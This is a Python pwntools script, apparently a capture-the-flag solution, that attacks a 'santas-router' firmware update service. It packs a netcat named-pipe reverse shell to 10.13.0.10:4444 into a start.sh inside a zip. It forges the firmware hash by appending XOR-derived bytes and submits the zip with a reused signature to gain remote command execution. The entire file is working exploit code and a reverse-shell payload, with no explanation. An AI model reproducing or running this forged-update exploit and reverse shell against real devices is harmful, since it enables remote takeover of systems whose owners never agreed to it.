import base64
import io
import zipfile
from pwn import *
from chall import hashFile

HOST = "152.96.15.2"
PORT = 1337
script = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.0.10 4444 >/tmp/f"

script_file = io.BytesIO(script.encode("utf-8"))
zip_file = io.BytesIO()
with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as archive:
    archive.writestr('start.sh', script_file.getvalue())

zip_bytes = zip_file.getvalue()
if len(zip_bytes) % 8 != 0:
    zip_bytes = zip_bytes + b"\x00" * (8 - (len(zip_bytes) % 8))

original_hash = hashFile(open('santas-router-source/firmware.zip', 'rb').read()).to_bytes(8)
cur_hash = hashFile(zip_bytes).to_bytes(8)
append_data = b''.join([(t^p).to_bytes(1) for t, p in zip(original_hash, cur_hash)])[::-1]
zip_bytes += append_data
encoded_zip = base64.b64encode(zip_bytes)

conn = remote(HOST, PORT)

conn.recvuntil(b"$ ")
conn.sendline(b"version")
version_line = conn.recvuntil(b"$ ")
signature = version_line.strip().splitlines()[0].split()[-1]
conn.sendline(b"update")
conn.recvuntil(b"> ")
conn.sendline(encoded_zip)
conn.recvuntil(b"> ")
conn.sendline(signature)
data = conn.recvuntil(b"$ ").splitlines()[0]
status_code = int(data.split()[-1])
success(f"{data.splitlines()[0].decode()} {chr(status_code)}")
conn.close()